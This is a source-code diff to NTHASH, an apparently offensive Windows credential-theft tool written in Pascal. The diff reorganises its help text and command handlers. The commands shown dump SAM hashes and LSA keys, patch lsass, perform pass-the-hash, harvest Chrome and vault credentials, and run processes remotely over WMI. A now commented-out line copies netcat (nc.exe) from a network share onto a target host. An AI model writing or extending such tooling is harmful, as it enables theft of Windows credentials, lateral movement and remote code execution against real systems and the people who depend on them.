@@ -1263,12 +1263,13 @@ begin
   log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
   log('NTHASH /gethash /password:password',1);
+  //*******************************************
   log('NTHASH /getsid /user:username [/server:hostname]',1);
   log('NTHASH /getusers [/server:hostname]',1);
   log('NTHASH /getdomains [/server:hostname]',1);
   log('NTHASH /dumpsam',1);
   log('NTHASH /dumphashes [/offline]',1);
-  log('NTHASH /dumphash /rid:500 [/offline]',1);
+  log('NTHASH /dumphash /rid:500 [/offline]',1); //will patch lsasss
   log('NTHASH /getsyskey [/offline]',1);
   log('NTHASH /getsamkey [/offline]',1);
   log('NTHASH /getlsakeys',1);
@@ -1276,7 +1277,7 @@ begin
   log('NTHASH /logonpasswords',1);
   log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1);
   log('NTHASH /enumcred',1);
-  log('NTHASH /enumcred2',1);
+  log('NTHASH /enumcred2',1); //will patch lsass
   log('NTHASH /enumvault',1);
   //***************************************************
   log('NTHASH /chrome [/binary:path_to_database]',1);
@@ -1291,20 +1292,21 @@ begin
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
+  //****************************************************
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runas [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runts /user:session_id [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /enumpriv',1);
-  log('NTHASH /enumproc',1);
-  log('NTHASH /killproc /pid:12345',1);
-  log('NTHASH /enummod /pid:12345',1);
+  //log('NTHASH /enumproc',1);
+  //log('NTHASH /killproc /pid:12345',1);
+  //log('NTHASH /enummod /pid:12345',1);
   log('NTHASH /dumpproc /pid:12345',1);
   //**************************************
   //log('NTHASH /enumprocwmi [/server:hostname]',1);
   //log('NTHASH /killprocwmi /pid:12345 [/server:hostname]',1);
-  //log('NTHASH /runwmi /binary:x:\folder\bin.exe [/server:hostname]',1);
+  log('NTHASH /runwmi /binary:x:\folder\bin.exe [/server:hostname]',1);
   //log('NTHASH /dirwmi /input:path [/server:hostname]',1);
   //***************************************
   log('NTHASH /a_command /verbose',1);
@@ -1548,13 +1550,13 @@ begin
      goto fin;
      end;
 //******************* WMI **********************
-  p:=pos('/enumprocwmi',cmdline);
+  p:=pos('/enumprocwmi',cmdline); //can be done with wmic
     if p>0 then
        begin
        uwmi._EnumProc (server);
        goto fin;
        end;
-    p:=pos('/runwmi',cmdline);
+    p:=pos('/runwmi',cmdline); //can be done with wmic but escaping chars is a PITA
       if p>0 then
          begin
          if binary='' then exit;
@@ -1562,35 +1564,37 @@ begin
          uwmi._Create (server,binary);
          goto fin;
          end;
-    p:=pos('/killprocwmi',cmdline);
+    p:=pos('/killprocwmi',cmdline);  //can be done with wmic
         if p>0 then
            begin
            if pid='' then exit;
            uwmi._Killproc  (server,strtoint(pid));
            goto fin;
            end;
-   p:=pos('/dirwmi',cmdline);
+   p:=pos('/dirwmi',cmdline);  //can be done with wmic
             if p>0 then
                begin
                if input='' then exit;
                uwmi._ListFolder(server,'','',input );
                goto fin;
                end;
-   p:=pos('/copywmi',cmdline);
+   {
+   p:=pos('/copywmi',cmdline);  //can be done with wmic
              if p>0 then
              begin
              //if input='' then exit;
-             uwmi._CopyFile(server,'\\192.168.1.248\public\nc.exe','c:\temp\nc.exe') ;
+             //uwmi._CopyFile(server,'\\192.168.1.248\public\nc.exe','c:\temp\nc.exe') ;
              goto fin;
              end;
+   }
 //*********PROCESS ********************
-  p:=pos('/enumproc',cmdline);
+  p:=pos('/enumproc',cmdline); //can be done with taskkill
     if p>0 then
        begin
        upsapi._EnumProc ;
        goto fin;
        end;
-    p:=pos('/enummod',cmdline);
+    p:=pos('/enummod',cmdline);  ////can be done with taskkill
     if p>0 then
        begin
        if pid='' then exit;
@@ -1604,7 +1608,7 @@ begin
      if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
      goto fin;
      end;
-  p:=pos('/killproc',cmdline);
+  p:=pos('/killproc',cmdline);  ////can be done with taskkill
   if p>0 then
      begin
      if pid='' then exit;
@@ -1721,6 +1725,16 @@ begin
           then log('Done',1)
           else log('Failed',1);
        end;
+  //***************** RUN *****************************
+  p:=pos('/pth',cmdline);
+  if p>0 then
+   begin
+   if IsElevated=false
+      then writeln('please runas elevated')
+      else pth(user,password,domain);
+   goto fin;
+   end;
+
   p:=pos('/runastoken',cmdline);
   if p>0 then
      begin
@@ -1768,6 +1782,7 @@ begin
    writeln(BoolToStr (runTSprocess(strtoint(user),binary),true));
    goto fin;
    end;
+  //******************* CRYPT **************************
   p:=pos('/cryptunprotectdata',cmdline);
   if p>0 then
      begin
@@ -1787,11 +1802,6 @@ begin
          then log('CryptUnProtectData_ NOT OK',1)
          else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
      end;
-  p:=pos('/pth',cmdline);
-  if p>0 then
-   begin
-   pth(user,password,domain);
-   end;
   //********* BROWSER ****************************************
   p:=pos('/chrome',cmdline);
   if p>0 then
